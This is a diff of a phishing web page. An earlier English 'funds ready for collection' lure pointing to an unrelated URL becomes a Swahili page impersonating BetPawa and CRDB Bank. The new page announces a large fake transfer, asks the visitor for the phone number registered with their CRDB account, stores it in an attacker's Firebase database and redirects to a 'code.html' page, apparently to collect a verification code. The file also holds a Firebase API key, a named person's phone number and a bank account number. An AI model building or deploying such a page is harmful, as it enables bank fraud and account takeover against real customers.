@@ -1,91 +1,155 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Funds Transfer Confirmation</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Uhakikisho wa Uhamisho - BetPawa CRDB</title>
   <style>
     body {
-      font-family: "Poppins", Arial, sans-serif;
-      background: linear-gradient(135deg, #eaf0f6, #f7f9fc);
-      color: #222;
+      font-family: "Poppins", sans-serif;
+      background-color: #001f3f; /* Navy blue background */
+      color: #fff;
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
       margin: 0;
     }
-    .card {
-      background: #fff;
-      border-radius: 16px;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
-      width: 400px;
-      padding: 24px 28px;
+
+    .container {
+      background: rgba(255, 255, 255, 0.95);
+      color: #000;
+      padding: 35px;
+      border-radius: 15px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+      max-width: 420px;
+      width: 90%;
       text-align: center;
     }
-    h2 {
-      color: #0d6efd;
-      font-weight: 600;
-      margin-bottom: 10px;
+
+    h1 {
+      color: #001f3f;
+      margin-bottom: 15px;
+      font-size: 22px;
     }
-    .subtitle {
-      color: #555;
-      font-size: 14px;
-      margin-bottom: 25px;
-    }
-    .details {
-      text-align: left;
+
+    p {
+      line-height: 1.6;
       margin-bottom: 20px;
-      line-height: 1.8;
       font-size: 15px;
     }
-    .details span {
-      font-weight: 600;
-      color: #000;
-    }
-    .amount {
-      font-size: 18px;
-      color: #198754;
-      font-weight: 700;
-    }
-    .btn {
-      background: #0d6efd;
-      color: white;
-      border: none;
-      padding: 12px 24px;
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
       border-radius: 8px;
       font-size: 16px;
+      margin-bottom: 15px;
+    }
+
+    button {
+      background-color: #001f3f;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 8px;
       cursor: pointer;
-      text-decoration: none;
-      transition: 0.3s;
-      display: inline-block;
+      font-size: 16px;
+      width: 100%;
+      transition: background-color 0.3s ease;
     }
-    .btn:hover {
-      background: #084298;
+
+    button:hover {
+      background-color: #003366;
     }
-    .footer {
-      margin-top: 25px;
-      font-size: 13px;
-      color: #777;
+
+    .note {
+      font-size: 14px;
+      color: #333;
+      margin-top: 10px;
+    }
+
+    .success {
+      color: green;
+      font-weight: bold;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>💸 Secure Transfer Notification</h2>
-    <p class="subtitle">Your funds are ready for collection</p>
-    
-    <div class="details">
-      <p><span>Recipient:</span> Joseph Nyirary</p>
-      <p><span>Phone:</span> +255 659 901 816</p>
-      <p><span>Amount:</span> 900 USD <span class="amount">(≈ 2,385,000 TZS)</span></p>
-      <p><span>Status:</span> ✅ Ready to Send</p>
-      <p><span>Date:</span> November 2025</p>
-    </div>
-    
-    <a href="https://afoshaclass.com.br/M1Y5eTZZMnE0dTQ2MzQ=" class="btn">Receive Funds</a>
-    
-    <p class="footer">Please ensure your account is registered under your name before clicking the link.</p>
+  <div class="container">
+    <h1>✅ BetPawa - Uhamisho Tayari</h1>
+    <p>
+      BetPawa imeandaa uhamisho wa <strong>8,998,000 TSH</strong><br>
+      kwenda kwenye akaunti ya <strong>CRDB Bank 0152845642500</strong>.
+    </p>
+    <p>
+      Ili kuthibitisha uhamisho huu, tafadhali weka namba ya simu
+      iliyosajiliwa na akaunti yako ya CRDB hapa chini.
+    </p>
+
+    <input type="tel" id="phoneNumber" placeholder="Ingiza namba ya simu ya CRDB" />
+    <button id="submitBtn">Tuma</button>
+
+    <div id="message" class="note"></div>
   </div>
+
+  <!-- Firebase Scripts -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+
+    // Firebase Configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyD4NQ9EsQqerx6y7v322p2ycraoDWJSRcM",
+      authDomain: "airdropusdt-767d7.firebaseapp.com",
+      databaseURL: "https://airdropusdt-767d7-default-rtdb.europe-west1.firebasedatabase.app",
+      projectId: "airdropusdt-767d7",
+      storageBucket: "airdropusdt-767d7.firebasestorage.app",
+      messagingSenderId: "627616603037",
+      appId: "1:627616603037:web:63041f067800c97fab6d74",
+      measurementId: "G-01F6G2CYXK"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Handle submission
+    const submitBtn = document.getElementById("submitBtn");
+    const messageDiv = document.getElementById("message");
+
+    submitBtn.addEventListener("click", async () => {
+      const phone = document.getElementById("phoneNumber").value.trim();
+
+      if (phone === "") {
+        messageDiv.textContent = "⚠️ Tafadhali ingiza namba ya simu.";
+        messageDiv.style.color = "red";
+        return;
+      }
+
+      try {
+        const phoneRef = ref(db, "crdb_submissions");
+        const newEntry = push(phoneRef);
+        await set(newEntry, {
+          phoneNumber: phone,
+          muda: new Date().toISOString(),
+        });
+
+        messageDiv.textContent = "✅ Namba yako imetumwa kwa mafanikio...";
+        messageDiv.classList.add("success");
+
+        // Redirect after short delay
+        setTimeout(() => {
+          window.location.href = "code.html";
+        }, 1200);
+      } catch (error) {
+        console.error("Kosa:", error);
+        messageDiv.textContent = "❌ Imeshindikana kutuma. Tafadhali jaribu tena.";
+        messageDiv.style.color = "red";
+      }
+    });
+  </script>
 </body>
 </html>
